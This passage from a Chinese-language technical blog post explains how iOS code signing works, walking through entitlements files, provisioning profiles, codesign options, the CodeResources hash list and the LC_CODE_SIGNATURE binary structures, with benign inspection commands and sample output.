<p>沙盒(Sandbox)技术是iOS安全体系中非常重要的一项技术，他的目的是通过各种技术手段限制App的行为，比如可读写的路径，允许访问的硬件，允许使用的服务等等，即使应用出现任意代码执行的漏洞，也无法影响到沙盒外的系统。（图来自<a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html">Apple开发者网站</a>）</p>

<p><img src="http://xelz.info/assets/2019/sandboxing.png" alt="" /></p>

<p>通常所说的Entitlements(授权文件)，也就是指iOS沙盒的配置文件，这个文件中声明了app所需的权限，如果app中使用到了某项沙盒限制的功能，但没有声明对应的权限，可能运行到相关的代码时会直接Crash。</p>

<p>全新的iOS工程中是没有这个文件的，如果在<code>Capabilities</code>中开启了一些需要权限的功能之后，Xcode会自动(Xcode 8及之后的版本)生成Entilements文件，并将对应的权限声明添加到Entitlements文件中。</p>

<p><img src="http://xelz.info/assets/2019/ent1.png" alt="" /></p>

<p><img src="http://xelz.info/assets/2019/ent2.png" alt="" /></p>

<p>这个文件其实是xml格式的<code>plist</code>文件，内容如下</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span class='line'><span class="cp">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span>
</span><span class='line'><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>inter-app-audio<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;true/&gt;</span>
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span><span class='line'><span class="nt">&lt;/plist&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>实际上，这个文件的内容并非是全部的授权内容，因为缺省状态下，App默认会包含以下与Team ID及App ID相关的权限声明：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>keychain-access-groups<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>    <span class="nt">&lt;array&gt;</span>
</span><span class='line'>        <span class="nt">&lt;string&gt;</span>xxxxxxxxxx.*<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/array&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>get-task-allow<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>    <span class="nt">&lt;true/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>application-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>    <span class="nt">&lt;string&gt;</span>xxxxxxxxxx.test.CodeSign<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>com.apple.developer.team-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>    <span class="nt">&lt;string&gt;</span>xxxxxxxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>其中<code>get-task-allow</code>代表是否允许被调试，它在开发阶段是必需的一项权限，而在进行Archive打包用于上架时会被去除。</p>

<p>进行代码签名时，会将这个Entitlements文件(如有)与上述缺省内容进行合并，得到最终的授权文件，并嵌入二进制代码中，作为被签名内容的一部分，由代码签名保证其不可篡改性。</p>

<h4>Provisioning Profile</h4>

<p>Xcode对Provisioning Profile的解释是</p>

<blockquote><p> A provisioning profile is a collection of digital entities that uniquely ties developers and devices to an authorized iPhone Development Team and enables a device to be used for testing.</p></blockquote>

<p>Provisioning Profile在这里就起到了一个对设备和开发者授权的作用，他将开发者账号、证书、entitlements文件以及设备进行了绑定。</p>

<p>同样地，在开发过程中，Xcode 8及后续版本默认情况下会自动帮我们管理Provisioining Profile，自动下载的Provisioning Profile都被存放在<code>~/Library/MobileDevice/Provisioning\ Profiles/</code>路径下，以<code>UUID</code>格式命名。直接拖拽下图中的齿轮图标到Finder中也可以将其复制出来。</p>

<p><img src="http://xelz.info/assets/2019/provision1.png" alt="" /></p>

<p>由于这个文件是被苹果签过名的，所以我们没有办法伪造或者修改这个文件，它使用的是标准的CMS(Cryptographic Message Syntax)格式，可以通过security命令查看它的签名信息，并将文件的内容提取出来：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>security cms -D -i xxxxxxxxxxx.mobileprovision -h 1 -n  <span class="c"># 查看签名信息</span>
</span><span class='line'>SMIME:    <span class="nv">level</span><span class="o">=</span>1.2<span class="p">;</span> <span class="nb">type</span><span class="o">=</span>signedData<span class="p">;</span> <span class="nv">nsigners</span><span class="o">=</span>1<span class="p">;</span>
</span><span class='line'>      signer0.id<span class="o">=</span><span class="s2">&quot;Apple iPhone OS Provisioning Profile Signing&quot;</span><span class="p">;</span> signer0.status<span class="o">=</span>GoodSignature<span class="p">;</span>
</span><span class='line'>  <span class="nv">level</span><span class="o">=</span>1.1<span class="p">;</span> <span class="nb">type</span><span class="o">=</span>data<span class="p">;</span>
</span><span class='line'><span class="nv">$ </span>security cms -D -i ea8585cd-c2da-4b08-81c2-e32b28c34871.mobileprovision -o provision.plist  <span class="c"># 将内容导出</span>
</span></code></pre></td></tr></table></div></figure>


<p>Provisioning Profile统一都是由<code>Apple iPhone OS Provisioning Profile Signing</code>进行签名的，机构名称言简意赅。导出的provision.plist内容如下</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span class='line'><span class="cp">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span>
</span><span class='line'><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>AppIDName<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;string&gt;</span>TestCodeSign<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    ...
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>DeveloperCertificates<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;array&gt;</span>
</span><span class='line'>      <span class="nt">&lt;data&gt;</span>xxxxx<span class="nt">&lt;/data&gt;</span>
</span><span class='line'>        <span class="nt">&lt;data&gt;</span>xxxxx<span class="nt">&lt;/data&gt;</span>
</span><span class='line'>        <span class="nt">&lt;data&gt;</span>xxxxx<span class="nt">&lt;/data&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/array&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>Entitlements<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;dict&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>keychain-access-groups<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;array&gt;</span>
</span><span class='line'>          <span class="nt">&lt;string&gt;</span>xxxxx.*<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>      <span class="nt">&lt;/array&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>inter-app-audio<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;true/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>get-task-allow<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;true/&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>application-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;string&gt;</span>xxxxx.test.CodeSign<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>com.apple.developer.team-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;string&gt;</span>xxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>      <span class="nt">&lt;key&gt;</span>com.apple.developer.siri<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>      <span class="nt">&lt;true/&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>ExpirationDate<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;date&gt;</span>2020-01-22T05:14:57Z<span class="nt">&lt;/date&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>Name<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;string&gt;</span>iOS Team Provisioning Profile: test.CodeSign<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>ProvisionedDevices<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;array&gt;</span>
</span><span class='line'>      <span class="nt">&lt;string&gt;</span>xxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>      <span class="nt">&lt;string&gt;</span>xxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>      <span class="nt">&lt;string&gt;</span>xxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/array&gt;</span>
</span><span class='line'>  ...
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span><span class='line'><span class="nt">&lt;/plist&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>很明显可以看出这是一个xml格式的plist文件，里面的内容不难理解，最关键的是这几项</p>

<ul>
<li><strong>DeveloperCertificates</strong>：允许使用的开发者证书，这是一个列表，一般包含生成这个Provisioning Profile文件时，当前开发者账号下所有有效的Development证书，以base64格式保存，使用base64解码之后就可以得到DER格式的开发者证书。通过计算每个证书的sha1值，可以看出，前文中新申请的证书，就在这个列表中</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="k">for </span>i in <span class="sb">`</span>seq 3<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> /usr/libexec/PlistBuddy -x -c <span class="s1">&#39;Print:DeveloperCertificates:&#39;</span><span class="nv">$i</span> provision.plist <span class="p">|</span> sed -n <span class="s1">&#39;/&lt;data&gt;/,/&lt;\/data&gt;/p&#39;</span> <span class="p">|</span> sed -e <span class="s1">&#39;1d;$d&#39;</span> <span class="p">|</span> base64 -D <span class="p">|</span> shasum <span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="k">  </span>11447116f2c5521b057b9b67290f0fdadeadfa0a  -    <span class="c"># &lt;--- 新申请的证书</span>
</span><span class='line'>  df446e4fad5aa292c7323da4cf7b8869fa5c89e7  -
</span><span class='line'>  9d31f7e8c27760ffa061598ba90ea614948224bf  -
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>Entitlements</strong>：允许使用的权限列表，实际在App中使用的权限必须是这个列表的子集，否则安装时会无法通过校验而失败。如果曾经开启过某个功能，Xcode自动更新了Provisioning Profile，后来又关闭它，Xcode并不会将其从Provisioning Profile中删去，如示例中的<code>com.apple.developer.siri</code>。</li>
<li><strong>ProvisionedDevices</strong>：允许安装的设备列表，如果目标设备的UUID不在这个列表中，会安装失败。对于这一项，普通开发者证书和企业级开发者证书的待遇是不同的。普通开发者证书使用Provisioning Profile的方式安装App到设备，只是出于测试和调试的需要，因此Apple只允许最多注册100台用于测试的设备，否则开发者就可以以测试的名义任意任意分发自己的App了。而对于企业级开发者来说，本身就有任意安装的需求，因此在分发时，这一项会被<code>ProvisionsAllDevices</code>取代，代表授权任意设备。</li>
</ul>


<p>这些信息中有任何变动的时候，比如开发者证书有新增或者失效，在Capabilities中启用了当前App从未使用过的新功能，或是将新的iPhone连接到Xcode用于测试，Xcode都会自动重新申请Provisioning Profile。</p>

<p>Provisioning Profile会被内置在App中，置于App根目录下的<code>embedded.mobileprovision</code>。安装App时如果签名校验通过，这个文件会自动被拷贝到iOS设备的<code>/Library/MobileDevice/Provisioning\ Profiles/</code>路径下。由于该文件已被Apple官方签名，系统可以无条件信任它，并用它来校验App的签名、权限，以及本机的UUID等是否满足来自官方的授权。通过这种方式，间接信任了使用开发者证书签名的App，让iOS设备可以运行非苹果官方签名的App。</p>

<p>假如你有一台越狱的设备，查看任意一个从AppStore上下载下来的App，里面都不会有embedded.mobileprovision这个文件，因为经过Apple重新签名以后，设备就不再需要它了。</p>

<h2>0x05 CodeSign</h2>

<p>万事具备，只欠东风，已经具备了签名所需的所有条件，接下来就可以开始研究签名的具体过程了。</p>

<p>在编译iOS App时，Xcode在编译的打包的流程中会自动进行代码签名， 可以在编译日志界面找到一个<code>Sign</code>的步骤，内部是调用了<code>codesign</code>这个命令对app进行签名</p>

<p><img src="http://xelz.info/assets/2019/sign1.png" alt="codesign" /></p>

<p>codesign有几个关键参数</p>

<ul>
<li><code>--sign sign_identity</code> 指定签名所用的证书，可以指定证书的名字，比如<code>"iPhone Developer: xxx (xxx)"</code>也可以直接写证书文件的sha1值，xcode中就是直接指定sha1值的。通过观察图中的sha1值可以看出xcode自动选择了刚申请的最新证书。</li>
<li><code>--entitlements entitlements_file</code> 指定签名所需要的entitlements文件，这里的entitlements文件跟前面看到的并不是同一个文件，而是基于原有entitlements文件，补充上缺省权限后生成的临时文件</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span class='line'><span class="cp">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span>
</span><span class='line'><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>application-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;string&gt;</span>xxxxxxxxxx.test.CodeSign<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>com.apple.developer.team-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;string&gt;</span>xxxxxxxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>get-task-allow<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;true/&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>inter-app-audio<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;true/&gt;</span>
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span><span class='line'><span class="nt">&lt;/plist&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>如果想对比签名前后的区别，可以在<code>Build Settings</code>中找到<code>Code Signing Identity</code>，选择<code>Other</code>并将内容清除(即设置为空)，即可跳过代码签名。分别编译一个不签名的版本和签名的版本，对比可以发现</p>

<p><img src="http://xelz.info/assets/2019/sign2.png" alt="compare" /></p>

<ul>
<li>签名过的app中多了一个<code>_CodeSignature</code>文件夹，里面只有一个文件<code>CodeResources</code></li>
<li>还多了一个<code>embedded.mobileprovision</code> 文件</li>
<li>二进制文件的内容存在差异，并且签名后体积变大了</li>
</ul>


<p>其中<code>embedded.mobileprovision</code>就是前文提到的Provisioning Profile文件，它直接被拷贝到了app的根目录并重命名，在此不再赘述，重点研究下另外两个不同点。</p>

<h4>_CodeSignature/CodeResources</h4>

<p>首先是<code>_CodeSingature/CodeResources</code>，这是一个plist文件，里面保存了app中每个文件（除了App的可执行文件）的<code>明文哈希值</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>files<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;dict&gt;</span>
</span><span class='line'>        <span class="nt">&lt;key&gt;</span>Base.lproj/Main.storyboardc/Info.plist<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>        <span class="nt">&lt;data&gt;</span>
</span><span class='line'>            MDrKFvFWroTb0+KEbQShBcoBvo4=
</span><span class='line'>        <span class="nt">&lt;/data&gt;</span>
</span><span class='line'>      ...
</span><span class='line'>  <span class="nt">&lt;/dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>files2<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;dict&gt;</span>
</span><span class='line'>        <span class="nt">&lt;key&gt;</span>Base.lproj/Main.storyboardc/Info.plist<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>        <span class="nt">&lt;dict&gt;</span>
</span><span class='line'>            <span class="nt">&lt;key&gt;</span>hash<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>            <span class="nt">&lt;data&gt;</span>
</span><span class='line'>                MDrKFvFWroTb0+KEbQShBcoBvo4=
</span><span class='line'>            <span class="nt">&lt;/data&gt;</span>
</span><span class='line'>            <span class="nt">&lt;key&gt;</span>hash2<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>            <span class="nt">&lt;data&gt;</span>
</span><span class='line'>                PpvapAjR62rl6Ym4E6hkTgpKmBICxTaQXeUqcpHmmqQ=
</span><span class='line'>            <span class="nt">&lt;/data&gt;</span>
</span><span class='line'>        <span class="nt">&lt;/dict&gt;</span>
</span><span class='line'>      ...
</span><span class='line'>  <span class="nt">&lt;/dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>rules<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  ...
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>rules2<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  ...
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span><span class='line'><span class="nt">&lt;/plist&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>files</code>和<code>files2</code>分别是旧版本和新版本的文件列表，而<code>rules</code>与<code>rules2</code>分别是与之对应的规则说明，里面描述了计算hash时需要被排除的文件以及每个文件的权重。</p>

<p><code>files</code>中保存的是每个文件的sha1值，而<code>files2</code>中同时保存了sha1和sha256，因为sha1在计算机硬件高度发达的今天，已经相对没有那么安全了，因此最新的签名算法中，引入了sha256。注意，这里的hash值都是base64编码的明文，有些文章说这些值是使用私钥加密的哈希，这是很不负责任的错误说法，通过几条简单的命令就可以进行验证：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat Base.lproj/Main.storyboardc/Info.plist <span class="p">|</span> shasum -a 1
</span><span class='line'>303aca16f156ae84dbd3e2846d04a105ca01be8e  -
</span><span class='line'><span class="nv">$ </span><span class="nb">echo</span> -n <span class="s1">&#39;MDrKFvFWroTb0+KEbQShBcoBvo4=&#39;</span> <span class="p">|</span> base64 -D <span class="p">|</span> hexdump
</span><span class='line'>0000000 30 3a ca 16 f1 56 ae 84 db d3 e2 84 6d 04 a1 05
</span><span class='line'>0000010 ca 01 be 8e
</span><span class='line'><span class="nv">$ </span><span class="c"># =========== 分割线 ===========</span>
</span><span class='line'><span class="nv">$ </span>cat Base.lproj/Main.storyboardc/Info.plist <span class="p">|</span> shasum -a 256
</span><span class='line'>3e9bdaa408d1eb6ae5e989b813a8644e0a4a981202c536905de52a7291e69aa4  -
</span><span class='line'><span class="nv">$ </span><span class="nb">echo</span> -n <span class="s1">&#39;PpvapAjR62rl6Ym4E6hkTgpKmBICxTaQXeUqcpHmmqQ=&#39;</span> <span class="p">|</span> base64 -D <span class="p">|</span> hexdump
</span><span class='line'>0000000 3e 9b da a4 08 d1 eb 6a e5 e9 89 b8 13 a8 64 4e
</span><span class='line'>0000010 0a 4a 98 12 02 c5 36 90 5d e5 2a 72 91 e6 9a a4
</span></code></pre></td></tr></table></div></figure>


<p><code>_CodeSignature/CodeResources</code>文件的主要作用是保存签名时每个文件的哈希值，而这些哈希值并不需要都进行加密，因为非对称加密的性能是比较差的，全部都加密只会拖慢签名和校验的速度。其实只需要确保这个文件没有被篡改，自然也就可以确保每个文件都是签名时的原始状态，这一点在后续的内容中可以得到验证。</p>

<h4>LC_CODE_SIGNATURE</h4>

<p>使用<code>otool -l</code>对比签名前后的二进制文件，可以发现签名后二进制文件多了一个名为<code>LC_CODE_SIGNATURE</code>的Load Command</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>otool -l TestCodeSign <span class="p">|</span> tail -n 5
</span><span class='line'>Load <span class="nb">command </span>21
</span><span class='line'>      cmd LC_CODE_SIGNATURE
</span><span class='line'>  cmdsize 16
</span><span class='line'>  dataoff 54016
</span><span class='line'> datasize 19888
</span></code></pre></td></tr></table></div></figure>


<p>MachOView中查看如下</p>

<p><img src="http://xelz.info/assets/2019/codesign1.png" alt="" /></p>

<p>代码签名是一段纯二进制的数据，可以在<a href="https://opensource.apple.com/source/Security/Security-55471/sec/Security/Tool/codesign.c.auto.html">https://opensource.apple.com/source/Security/Security-55471/sec/Security/Tool/codesign.c.auto.html</a> 看到一些结构定义，结合数据定义来分析</p>

<p><img src="http://xelz.info/assets/2019/codesign2.png" alt="" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// 红色部分①  Offset: 0xD300 = 54016 LC_CODE_SIGNATURE-&gt;dataoff</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__SuperBlob</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">magic</span><span class="p">;</span>   <span class="cm">/* 0xFADE0CC0 = CSMAGIC_EMBEDDED_SIGNATURE */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>  <span class="cm">/* 0x1A1E -&gt; 6686 */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">count</span><span class="p">;</span>   <span class="cm">/* 5 */</span>
</span><span class='line'>    <span class="n">CS_BlobIndex</span> <span class="n">index</span><span class="p">[];</span>  <span class="cm">/* 蓝色部分 */</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="c1">// 蓝色部分②  5个BlobIndex</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__BlobIndex</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">type</span><span class="p">;</span>    <span class="cm">/* 0x0 -&gt; Code Directory */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">;</span>  <span class="cm">/* 0x34 -&gt; 0xD300 + 0x34 = 0xD334 指向绿色③*/</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__BlobIndex</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">type</span><span class="p">;</span>    <span class="cm">/* 0x2 -&gt; Requirements */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">;</span>  <span class="cm">/* 0x221 -&gt; 0xD300 + 0x221 = 0xD521 */</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__BlobIndex</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">type</span><span class="p">;</span>    <span class="cm">/* 0x5 -&gt; Entitlements */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">;</span>  <span class="cm">/* 0x2CD -&gt; 0xD300 + 0x2CD = 0xD5CD */</span>
</span><span class='line'><span class="p">}</span>
